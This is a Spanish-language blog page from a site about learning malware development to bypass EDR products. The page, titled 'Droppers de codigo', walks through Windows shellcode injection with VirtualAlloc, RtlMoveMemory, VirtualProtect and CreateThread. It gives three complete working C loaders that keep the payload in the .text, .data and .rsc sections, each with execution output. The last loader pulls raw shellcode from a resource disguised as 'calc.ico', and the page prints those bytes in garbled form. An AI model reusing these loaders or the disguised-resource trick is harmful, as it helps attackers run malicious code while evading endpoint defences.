<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/Droppers_codigo.html" />
<meta property="og:url" content="http://localhost:4000/Droppers_codigo.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/Droppers_codigo.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="droppers-de-codigo">Droppers de codigo</h1>

<p>Dentro de un proceso del sistema operativo se realizar√° una inyecci√≥n de c√≥digo cuando se ejecute un trozo de c√≥digo a bajo nivel introducido por el desarrollador/hacker.</p>

<p>Dentro de la memoria del proceso, estar√° definido segun ell siguiente diagrama:</p>

<p>En funci√≥n de donde se almacene en el codigo funte del binario el shellcode, diferenciaremos entre las secciones:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text
.data
.rsc
</code></pre></div></div>
<h2 id="pesudo-codigo-b√°sico-inyecci√≥n-de-shellcode-en-proceso">Pesudo-codigo b√°sico: Inyecci√≥n de shellcode en proceso</h2>
<p>El diagrama de ejecci√≥n b√°sica para la inyecci√≥n de c√≥digo ser√° la siguiente:
<img src="Code_inyection_diagram.png" alt="Code_inyection" /></p>

<p>El pseudo c√≥digo asociado a la inyecci√≥n de un payload de forma b√°sica ser√° el siguiente:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. Se reserva el espacio asociado al payload en memoria din√°mica del proceso en ejecuci√≥n con permisos de lectura y escritura </span>
<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(...,</span> <span class="n">payload_length</span><span class="p">,...,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>

<span class="c1">// 2. Se copia el shellcode o payload desde el binario de su secci√≥n (.text, .data, .rsc) al espacio de memoria reservado</span>
<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_length</span><span class="p">)</span>

<span class="c1">// 3. Se modifican los permisos del espacio de memoria reservado con privilegios de ejecuci√≥n </span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_length</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,...)</span>

<span class="c1">// 4. Se crea un nuevo hilo en el proceso local que ejecute el c√≥digo almacenado en el espacio de memoria reservado</span>
<span class="n">CreateThread</span><span class="p">(...,</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="p">...)</span>
</code></pre></div></div>
<p>En referencia a las funciones asociadas a la inyecci√≥n de c√≥digo, es posible identificar los par√°metros de entrada y la dll asociada del sistema operativo a la que se invoca en tiempo de ejecuci√≥n apra la ejecuci√≥n de la llamada:</p>

<h3 id="virtualalloc">VirtualAlloc()</h3>

<p>Esta funci√≥n, es utilizada para reservar din√°micamente en tiempo de ejecuci√≥n un espacio de memoria en el contexto de memoria del proceso que la invoca.
Pertenece a la librer√≠a kernel32.dll
Los par√°metros de entrada ser√°n los siguientes:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>        <span class="c1">// Posici√≥n en la que se quiere iniciar el espacio reservado de memoria, si es nulo el SO reserva din√°micamente el espacio</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>           <span class="c1">// Tama√±o del espacio que se quiere reservar en bytes </span>
  <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span> <span class="c1">// Tipo de reserva de memoria que se quiere utilizar: MEM_COMMIT, MEM_RESERVE</span>
  <span class="n">DWORD</span>  <span class="n">flProtect</span>         <span class="c1">// Tipo de privilegios que se le quiere dar al espacio de memoria reservado. PAGE_READWRITE, PAGE_EXECUTE_READWRITE, etc.</span>
<span class="p">);</span>
</code></pre></div></div>
<p>Si la funci√≥n termina de forma satisfactoria, devolvera la posici√≥n de memoria en la que comienza el espacio reservado, en caso contrario devolver√° NULL.</p>

<h3 id="rtlmovememory">RtlMoveMemory()</h3>

<p>Esta funci√≥n, es utilizada para copiar los bytes de entrada desde una posici√≥n de memoria a otra.
Pertenece a la librer√≠a ntdll.dll
Los par√°metros de entrada ser√°n los siguientes:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">RtlMoveMemory</span><span class="p">(</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span>    <span class="c1">// Puntero a la posici√≥n de memoria inicial del destino</span>
  <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span>   <span class="c1">// Puntero a la posici√≥n de momoria inicial del origen</span>
  <span class="kt">size_t</span> <span class="n">Length</span>         <span class="c1">// Logitud de los bytes  que se quieren copiar del origen al destino</span>
<span class="p">);</span>
</code></pre></div></div>
<p>Si la funci√≥n termina su ejecuci√≥n de forma satisfactoria, no retornar√° nada, en caso de error se producir√° una excepci√≥n en tiempo de ejecuci√≥n.</p>

<h3 id="virtualprotect">VirtualProtect()</h3>

<p>Esta funci√≥n, es utilizada para modificar los atributos de protecci√≥n en el espacio de momoria reservado din√°micamente dentro del contexto del proceso en ejecuci√≥n.
Pertenece a la librer√≠a kernel32.dll
Los par√°metros de entrada ser√°n los siguientes:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">VirtualProtect</span><span class="p">(</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>      <span class="c1">// Posici√≥n de momoria inicial a la que se la quiera modificar la protecci√≥n</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>         <span class="c1">// Longitud  en bytes desde la posici√≥n inicial a la ques e le quiere modificar la protecci√≥n inicial</span>
  <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>   <span class="c1">// Nueva propiedad/es de protecci√≥n solicitadas. PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, etc.</span>
  <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>  <span class="c1">// Puntero a la antigua variable que contenia la protecci√≥n</span>
<span class="p">);</span>
</code></pre></div></div>
<p>Si la funci√≥n termina la ejecuci√≥n de forma satisfactoria devolvera un valor diferente de 0, en caso contrar√≠o devolver√° 0.</p>

<h3 id="createthread">CreateThread()</h3>

<p>Esta funci√≥n, es utilizada para la creaci√≥nd eun nuevo hilo en el contexto del proceso actual, para la ejecuci√≥n del c√≥digo almacenado en una posici√≥n de memoria.
Pertenece a la librar√≠a kernel32.dll
Los par√°metros de entrada ser√°n los siguientes:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateThread</span><span class="p">(</span>
  <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>  <span class="c1">// Determina el si tiene herencia o no del proceso hijo del que cualga el hilo que se va a ejecutar.</span>
  <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>         <span class="c1">// Tama√±o de la pila en memoria en bytes</span>
  <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>      <span class="c1">// Puntero a la direcci√≥n de memoria de la funci√≥n que ser√° ejecutada por el hilo</span>
  <span class="n">LPVOID</span>                  <span class="n">lpParameter</span><span class="p">,</span>         <span class="c1">// Puntero a la posici√≥n de memoria de los par√°metros de entrada </span>
  <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>     <span class="c1">// Flags de ejecuci√≥n, despues de creaci√≥n tiempo de delay,etc</span>
  <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>           <span class="c1">// Puntero a la variable que almacenar√° el Identificador del thread que se va a ejecutar</span>
<span class="p">);</span>
</code></pre></div></div>
<p>Si la funci√≥n termina la ejecuci√≥n de forma satisfactoria, delvolvera el identificador del hilo, en caso contrario devolver√° el valor NULL.</p>

<h2 id="inyeccion-en-text">Inyeccion en .text</h2>

<p>C√≥digo de ejemplo, el shellcode se almacena dentro de una variable local en el c√≥digo fuente:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
		<span class="mh">0x90</span><span class="p">,</span>		<span class="c1">// NOP</span>
		<span class="mh">0x90</span><span class="p">,</span>		<span class="c1">// NOP</span>
		<span class="mh">0xcc</span><span class="p">,</span>		<span class="c1">// INT3</span>
		<span class="mh">0xc3</span>		<span class="c1">// RET</span>
	<span class="p">};</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
	
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sotred payload in .text section: %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"payload addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualAlloc] of new moemory region: %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"exec_mem addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [RtlMoveMemory] copy data </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [CreateThread] Exec stored payload </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>Salida de la ejecuci√≥n:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Sotred payload in .text section: payload addr         : 0x0000008CB73BF820

 [VirtualAlloc] of new moemory region: exec_mem addr        : 0x000001A307D40000


 [RtlMoveMemory] copy data

 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ


 [CreateThread] Exec stored payload

</code></pre></div></div>
<h2 id="inyeccion-en-data">Inyeccion en .data</h2>

<p>C√≥digo de ejemplo, el shellcode se almacena dentro de una variable global en el c√≥digo fuente:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
		<span class="mh">0x90</span><span class="p">,</span>		<span class="c1">// NOP</span>
		<span class="mh">0x90</span><span class="p">,</span>		<span class="c1">// NOP</span>
		<span class="mh">0xcc</span><span class="p">,</span>		<span class="c1">// INT3</span>
		<span class="mh">0xc3</span>		<span class="c1">// RET</span>
	<span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
	
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sotred payload in .data section %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"payload addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualAlloc] of new moemory region %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"exec_mem addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [RtlMoveMemory] copy data </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [CreateThread] Exec stored payload </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>Salida de la ejecuci√≥n:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sotred payload in .data section payload addr         : 0x00007FF63C66D000

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x000002D511870000

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload

</code></pre></div></div>
<h2 id="inyeccion-en-rsc">Inyeccion en .rsc</h2>

<p>C√≥digo de ejemplo, el shellcode se almacena dentro de una librer√≠a externa al c√≥digo fuente:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"resources.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">HGLOBAL</span> <span class="n">resHandle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HRSRC</span> <span class="n">res</span><span class="p">;</span>
	
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Extract data from external resource FAVICON_ICO"</span><span class="p">);</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">FindResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">FAVICON_ICO</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Extract data from external resource %-20s "</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
	<span class="n">resHandle</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Extract data from external resource %-20s "</span><span class="p">,</span> <span class="n">resHandle</span><span class="p">);</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">resHandle</span><span class="p">);</span>
	<span class="n">payload_len</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sotred payload in .text section %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"payload addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualAlloc] of new moemory region %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"exec_mem addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [RtlMoveMemory] copy data </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [CreateThread] Exec stored payload </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
	

</code></pre></div></div>
<p>Cabecera recurso externo resource.h:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define FAVICON_ICO 100
</span>
</code></pre></div></div>
<p>C√≥digo recurso externo resource.rc que define el recurso externo al que se quiere acceder en tiempo de ejecuci√≥n:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"resources.h"</span><span class="cp">
</span>
<span class="n">FAVICON_ICO</span> <span class="n">RCDATA</span> <span class="n">calc</span><span class="p">.</span><span class="n">ico</span>

</code></pre></div></div>
<p>calc.ico, recurso externo que contiene el shellcode ne format raw:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">√º</span><span class="n">H</span><span class="err">∆í√§√∞√®√Ä</span>   <span class="n">AQAPRQVH1</span><span class="err">√í</span><span class="n">eH</span><span class="err">‚Äπ</span><span class="n">R</span><span class="err">`</span><span class="n">H</span><span class="err">‚Äπ</span><span class="n">R</span><span class="err"></span><span class="n">H</span><span class="err">‚Äπ</span><span class="n">R</span> <span class="n">H</span><span class="err">‚Äπ</span><span class="n">rPH</span><span class="err">¬∑</span><span class="n">JJM1</span><span class="err">√â</span><span class="n">H1</span><span class="err">√Ä¬¨</span><span class="o">&lt;</span><span class="n">a</span><span class="o">|</span><span class="err"></span><span class="p">,</span> <span class="n">A</span><span class="err">√Å√â</span>
<span class="n">A</span><span class="err">√Å√¢√≠</span><span class="n">RAQH</span><span class="err">‚Äπ</span><span class="n">R</span> <span class="err">‚Äπ</span><span class="n">B</span><span class="o">&lt;</span><span class="n">H</span><span class="err">√ê‚Äπ‚Ç¨ÀÜ</span>   <span class="n">H</span><span class="err">‚Ä¶√Ä</span><span class="n">tgH</span><span class="err">√ê</span><span class="n">P</span><span class="err">‚Äπ</span><span class="n">H</span><span class="err"></span><span class="n">D</span><span class="err">‚Äπ@</span> <span class="n">I</span><span class="err">√ê√£</span><span class="n">VH</span><span class="err">√ø√â</span><span class="n">A</span><span class="err">‚Äπ</span><span class="mi">4</span><span class="err">ÀÜ</span><span class="n">H</span><span class="err">√ñ</span><span class="n">M1</span><span class="err">√â</span><span class="n">H1</span><span class="err">√Ä¬¨</span><span class="n">A</span><span class="err">√Å√â</span>
<span class="n">A</span><span class="err">√Å</span><span class="mi">8</span><span class="err">√†</span><span class="n">u</span><span class="err">√±</span><span class="n">L</span><span class="err"></span><span class="n">L</span><span class="err">$</span><span class="n">E9</span><span class="err">√ë</span><span class="n">u</span><span class="err">√ò</span><span class="n">XD</span><span class="err">‚Äπ@$</span><span class="n">I</span><span class="err">√ê</span><span class="n">fA</span><span class="err">‚Äπ</span><span class="n">HD</span><span class="err">‚Äπ@</span><span class="n">I</span><span class="err">√ê</span><span class="n">A</span><span class="err">‚ÄπÀÜ</span><span class="n">H</span><span class="err">√ê</span><span class="n">AXAX</span><span class="o">^</span><span class="n">YZAXAYAZH</span><span class="err">∆í√¨</span> <span class="n">AR</span><span class="err">√ø√†</span><span class="n">XAYZH</span><span class="err">‚Äπ√©</span><span class="n">W</span><span class="err">√ø√ø√ø</span><span class="p">]</span><span class="n">H</span><span class="err">¬∫</span>       <span class="n">H</span><span class="err">¬ç¬ç</span>  <span class="n">A</span><span class="err">¬∫</span><span class="mi">1</span><span class="err">‚Äπ</span><span 